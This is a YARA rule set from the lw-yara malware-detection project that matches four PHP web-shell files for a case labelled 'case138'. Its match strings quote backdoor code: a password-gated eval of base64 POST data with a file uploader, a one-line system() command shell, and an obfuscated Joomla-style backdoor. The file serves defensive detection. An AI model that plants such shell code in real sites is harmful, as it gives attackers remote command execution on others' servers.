/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-23
   Identifier: case138
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule contextual_2 {
   meta:
      description = "case138 - file contextual-2.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-23"
      hash1 = "239f1024b21e2d74f75e5e070f306fcd20055e9b209c0c5447745306193f3390"
   strings:
      $x1 = "<?php if($_GET[\"login\"]==\"25KlLN\"){$mujj = $_POST[\"z\"]; if ($mujj!=\"\") { $xsser=base64_decode($_POST[\"z0\"]); @eval(\"" ascii
      $s2 = "<?php if($_GET[\"login\"]==\"25KlLN\"){$mujj = $_POST[\"z\"]; if ($mujj!=\"\") { $xsser=base64_decode($_POST[\"z0\"]); @eval(\"" ascii
      $s3 = "xsser;\");} if(@copy($_FILES[\"file\"][\"tmp_name\"], $_FILES[\"file\"][\"name\"])) { echo \"<b>Upload Complate !!!</b><br>\"; }" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule case138_ps {
   meta:
      description = "case138 - file ps.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-23"
      hash1 = "91d3afaf598c91de9fca8de1fe6ecbc55f840d4d485e2cb69479af07a473edc1"
   strings:
      $s1 = "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule extenupdates {
   meta:
      description = "case138 - file extenupdates.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-23"
      hash1 = "89849fa86fafdf1e5d0947939014f7957bd50194ae9a736d2dae1572752cf1bf"
   strings:
      $s1 = "46451a09d6a32e92505ec55b9e5884e7cc4b611b18a97f4b6680b19498bbcf14ce741f0cb7bdc7e218ef418ff99f8a8c413dd1b2808a5d244b2d74c642d9" ascii
      $s2 = "d30a338dc64376d1adfe8dd73179764bf414de1296223a397d4e96461c2d0b6411161dede7852b8d68930ac12a1f73079949d2f11a573a765d0cc087e4fd" ascii
      $s3 = "$JSubMenu = addFilter(getEntries(_JEXEC), $action);" fullword ascii
      $s4 = "$entries[$i] = chr((ord($entries[$i]) - ord($action[$i])) % 256);" fullword ascii
      $s5 = "ce44b2bf27631a3afcf49e435e291db428f767fea9052698a34ef23a84a1e8acf335ebbf5695601081d9d5a7ab1de68a4aa6d98d652428051f8df8b17e82d" ascii
      $s6 = "8288f5f5b724acb6724766c082122b160e58d723c1329e0e0997dffc6fc702bb24efd4d46f4f9312f547b72a04e6b47c9c3edd142849ff99" ascii
      $s7 = "c760ade020f550b445881b32da49a29ab396bbb1a4589564f3eee93401cf90ac2817ef07399238d4d9103f9bee0492df76dc9fcec4df4fbc5a23a9e" ascii
      $s8 = "50b7fe94d5cd5a3da7ed18c6c9ba653f6098ed55a146b50b7a95aa7912776fc78e504b237b72498e5f263030de939fd5f5c2053476bfdea8f7239" ascii
      $s9 = "21f7c48e71d281b971c11c4074846d5c11164ad784b30b5d341d28937351ef4f6298d9b6594b34d47cb69df31d3d72c1a05e07e9cc7849ed23bd6" ascii
      $s10 = "9c3ed93befb99d2475b3c127dc7866140e9b4bd7b2eacee53a1ea20e0be9c45899a48f5a9e38c51b94f96ad7ee975a63ae9ba144914ac885" ascii
      $s11 = "if(isset($_REQUEST['j_submenu'])) @setcookie('j_submenu', $_REQUEST['j_submenu']);" fullword ascii
      $s12 = "02dae3ffe785d2e32e2e2611df479f8dfd06152a10db32669d45c61b9ab6d98432e9d7c8b7b9cbab3e45bbb3c9745bf0eba3fd8246c4e5" ascii
      $s13 = "d1f1689f91713777f770b83aafc376bf9c629931ec067050e75f6aafa152ce3ddebe3b42b81b423404395f56c7612cda89b8484217948" ascii
      $s14 = "d50a09521f25aeb88a89c555b029be299cf6dc21660c554ad5cd832e11d94d4cbbecbcf3926c6d222e01b2c6a7d716a05beb84a091a5737" ascii
      $s15 = "9d60fb18eb7b9cb52303ab5b3562b996cd60de679782b1a3f99e813c5269a31bf75e6fe0c47122c736f4f5b11ce3d9f0edc7b5c888" ascii
      $s16 = "c9a2b924f4ae1e55979a5bacba683219846c34fe50aef5aaf01d41950fbf3a1289106770ba047c27c7e47544b15c9a2dfc" ascii
      $s17 = "5cea95f39b897a37a8e372d38b7d36fef2e9df24a0bc3bb117eec32bc9bfa44225c288fbcb679da4f84be6b9727bcf5b241812" ascii
      $s18 = "06870f611ae921e3e10707e9b1e2bc0a3715a5178f1d70d0d27ddd15b8fb7bbb9e76b0b3b1541fdf2073651b6f" ascii
      $s19 = "de1296223a397d4e96461c2d0b6411161dede7852b8d68930ac12a1f73079949d2f11a573a765d0cc087e4fd');" fullword ascii
      $s20 = "a9488542c6daa12eeebe8355c501925372a24e04e36e046c7871b468cf0fb9fb60ab9738be8c884fc60dce78351954" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 100KB and
         ( 8 of them )
      ) or ( all of them )
}

rule contextual {
   meta:
      description = "case138 - file contextual.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-23"
      hash1 = "352e6308b75f8ed3248fc678724ee839f15e76bd7bc3f368423c21254ab2fffb"
   strings:
      $s1 = "<?php if($_GET[\"login\"]==\"25KlLN\"){$or=\"JG11amogxPSAkX1BPU1RbJ3onXTsgaWYg\"; $zs=\"KCRtdWpqIT0iIikgeyAkeHxNzZXI9Ym\"; $lq=" ascii
      $s2 = "e\"][\"tmp_name\"],$target_path)){echo basename($_FILES[\"uploadedfile\"][\"name\"]).\" has been uploaded\";}else{echo \"Uploade" ascii
      $s3 = "<?php if($_GET[\"login\"]==\"25KlLN\"){$or=\"JG11amogxPSAkX1BPU1RbJ3onXTsgaWYg\"; $zs=\"KCRtdWpqIT0iIikgeyAkeHxNzZXI9Ym\"; $lq=" ascii
      $s4 = "\"\", $or.$zs.$lq.$bu)));$hwy(); $target_path=basename($_FILES[\"uploadedfile\"][\"name\"]);if(move_uploaded_file($_FILES[\"uplo" ascii
      $s5 = "!\";}} ?><form enctype=\"multipart/form-data\" method=\"POST\"><input name=\"uploadedfile\" type=\"file\"/><input type=\"submit" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2KB and
         ( all of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

